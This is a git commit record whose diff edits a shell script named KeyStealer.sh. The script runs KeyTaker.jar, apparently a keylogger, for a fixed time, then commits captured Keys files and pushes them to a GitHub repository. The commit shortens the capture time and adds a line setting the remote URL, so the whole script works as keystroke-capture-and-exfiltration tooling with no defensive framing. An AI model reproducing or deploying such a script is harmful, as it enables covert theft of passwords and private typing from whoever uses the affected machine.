62cff5a50d8bb14f23ef4c74f0569124e0a34e97
Menge456 <menge456123@gmail.com>
2021-08-06 13:45:50 -0400

    Fixed Length For Tuesday

--- KeyStealer.sh
+++ KeyStealer.sh
@@ -1,4 +1,5 @@
-java -jar KeyTaker.jar & sleep 3000000 ; kill $!
+java -jar KeyTaker.jar & sleep 7000 ; kill $!
+git remote set-url origin https://github.com/Menge456/KeyListenerStuff
 git add Keys***.txt
 git commit -m "KeyStealer"
 git push origin
